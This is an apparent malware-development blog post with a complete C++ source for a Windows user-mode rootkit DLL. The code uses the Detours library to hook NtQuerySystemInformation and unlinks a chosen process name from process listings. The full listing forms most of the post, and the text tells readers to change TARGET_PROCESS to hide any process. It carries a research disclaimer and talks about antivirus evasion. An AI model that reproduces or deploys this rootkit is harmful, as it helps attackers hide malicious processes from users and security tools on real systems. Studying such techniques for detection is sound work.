---
title: "PoC Ring3 RootKit Development"
description: "PoC Ring3 (User Mode) RootKit Development"
date: 2025-10-25 00:00:00 +0900
categories: [Malware Research, Malware Development]
tags: [research, malware, rootkit, C++]
---

# PoC Ring3 (User Mode) RootKit Development

## YouTube
{% include embed/youtube.html id='hOPJ9YdcvCk5bhdW' %}

## GitHub Repo
::github{repo="therustymate/0x9C"}

## Disclaimer

This document and all associated materials are provided strictly for **legitimate security research, education, and authorized antivirus detection capability testing purposes only.**
The techniques and concepts described herein involve advanced software security, malware analysis, and development methods, and **any unauthorized use, reproduction, distribution, or malicious deployment against systems without explicit permission is strictly prohibited.**

By accessing and utilizing this material, you acknowledge and agree to comply with all applicable laws and regulations,
and to obtain proper authorization before conducting any security testing or research activities.

The author and affiliated parties **expressly disclaim all legal liability and responsibility for any misuse, unauthorized actions, or damages arising from the use of this information.**

Furthermore, this research was conducted to study current antivirus detection limitations, develop evasion techniques for educational purposes, and enhance cybersecurity expertise.
The disclosure of this technology is purely for advancing the security industry and academic research.

Therefore, all risks, legal responsibilities, and consequences resulting from the use or misuse of this document rest solely with the user.
The author and related parties are fully indemnified from any direct or indirect damages.

By reading or using this document, you are deemed to have accepted all the above conditions.

## How does a user mode rootkit work?
A user-mode rootkit typically works by injecting a DLL (Dynamic Link Library) into the target process, hooking the APIs that the process calls, and removing specific information from the actual return values.
Rootkits mainly hide information about processes, network activity, files, the registry, etc., to avoid detection.

## How to hide a process information?
The `NtQuerySystemInformation` API is a Windows native API that returns information about the processes present on the system.

```cpp
__kernel_entry NTSTATUS NtQuerySystemInformation(
  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,
  [in, out]       PVOID                    SystemInformation,
  [in]            ULONG                    SystemInformationLength,
  [out, optional] PULONG                   ReturnLength
);
```

```cpp
NTSTATUS NTAPI Hooked_NtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);
```

`SystemInformation` (of type PVOID) returns information about processes.
You can cast it to the existing `PSYSTEM_PROCESS_INFORMATION` type and, from each process entry, read the process name via `ImageName.Buffer` (a `PWCHAR` inside a `UNICODE_STRING`).
Using that, you can filter out specific process names from the process list and return the filtered result.
So when a DLL-injected process calls `NtQuerySystemInformation`, it will not see those filtered process names.

## How to hook a function?
The `Detours` library is a Windows library that enables hooking specific functions. Using it, you can hook native APIs and modify their results or record (log) them.

```bash
vcpkg install detours
vcpkg integrate install
```

Using the `vcpkg` tool, you can automatically include C++ header files and library files in `Visual Studio 2022`. In the case of `Detours`, the header file is located at `detours/detours.h`.

```cpp
#include <detours/detours.h>
```

## How to make a user mode rootkit?
The completed DLL source code is as follows:

```cpp
#include "pch.h"
#include <detours/detours.h>
#include <Windows.h>
#include <winternl.h>
#include <Psapi.h>

#pragma comment(lib, "detours.lib")

using namespace std;

const wchar_t* TARGET_PROCESS = L"Notepad.exe";

typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);
static NtQuerySystemInformation_t __NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(
    GetModuleHandle(L"ntdll.dll"),
    "NtQuerySystemInformation"
);

NTSTATUS NTAPI Hooked_NtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    NTSTATUS result = __NtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );

    if (SystemInformationClass == 5 && result == 0 && SystemInformation != nullptr) {
        PSYSTEM_PROCESS_INFORMATION prevInfo = nullptr;
        PSYSTEM_PROCESS_INFORMATION processInfo = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        while (processInfo->NextEntryOffset || processInfo->UniqueProcessId) {
            bool hidden = false;
            if (processInfo->ImageName.Buffer != nullptr &&
                _wcsicmp(processInfo->ImageName.Buffer, TARGET_PROCESS) == 0) {
                hidden = true;
            }

            if (hidden && prevInfo != nullptr) {
                if (processInfo->NextEntryOffset == 0) {
                    prevInfo->NextEntryOffset = 0;
                }
                else {
                    prevInfo->NextEntryOffset += processInfo->NextEntryOffset;
                }
            }
            else {
                prevInfo = processInfo;
            }

            if (processInfo->NextEntryOffset == 0) break;
            processInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)processInfo + processInfo->NextEntryOffset);
        }
    }

    return result;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)__NtQuerySystemInformation, Hooked_NtQuerySystemInformation);

        LONG error = DetourTransactionCommit();
    }
    else if (ul_reason_for_call == DLL_PROCESS_DETACH) {
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)__NtQuerySystemInformation, Hooked_NtQuerySystemInformation);

        LONG error = DetourTransactionCommit();
    }
    return TRUE;

}
```

The code iterates through the process information using `NextEntryOffset` when handling the hooked function. It compares `ImageName.Buffer` with the target process name, and if they match, it manipulates `NextEntryOffset` to remove the entry from the list so it links directly to the next process. (Current target process name is `Notepad.exe`. Change the `TARGET_PROCESS` value to set the target process to hide)

## Conclusion
In conclusion, the user-mode rootkit is injected into the target process as a DLL. After injection it hooks `NtQuerySystemInformation`, examines `ImageName.Buffer` in the `PSYSTEM_PROCESS_INFORMATION` structure, and if it matches a process that should be hidden, it modifies `NextEntryOffset` to remove that process from the list and link directly to the next entry to prevent the process from being seen.
